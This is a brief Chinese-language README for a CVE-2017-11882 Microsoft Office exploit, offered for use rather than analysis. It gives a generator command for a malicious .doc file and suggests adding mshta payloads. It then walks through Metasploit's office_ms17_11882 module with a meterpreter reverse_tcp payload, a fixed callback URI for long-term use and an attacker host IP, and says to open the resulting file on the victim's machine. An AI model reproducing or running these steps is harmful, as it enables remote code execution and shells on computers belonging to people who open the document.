# CVE-2017-11882

> 无弹窗，无视宏，影响Ms offcie全版本

## 简单测试

`python Command43b_CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o test.doc`

## 也有 109b 可供使用

> 可对应添加自己使用的代码 `mshta`等

## 使用已经写好的metasploit 模块使用

`search office_ms17_11882`

`use exploit/windows/fileformat/office_ms17_11882`

`set payload windows/meterpreter/reverse_tcp`

设置生成的文件名字
   `set filename bboysoul.doc`

设置回调uripath 不采用随机，则长期可用
   `set uripath text`

设置主机ip
   `set lhost 172.17.0.2`

开始攻击
   `run -j`

```bash
Using URL: http://0.0.0.0:8080/text
[*] Local IP: http://172.17.0.2:8080/text
[*] Server started.
[+] mydoc.doc stored at /root/.msf4/local/bboysoul.doc
```

之后当前目录下会生成一个叫`bboysoul.doc`的文件，在受害者机器下打开就好

> 经过测试`32`位的`windows`和`office`是不能用的
接着在受害者机器打开这个文件就好了

## 原理

本质上也是回调连接一个攻击机器的uripath ，然后在远程执行这个uri中的payload内容，然后进行连接
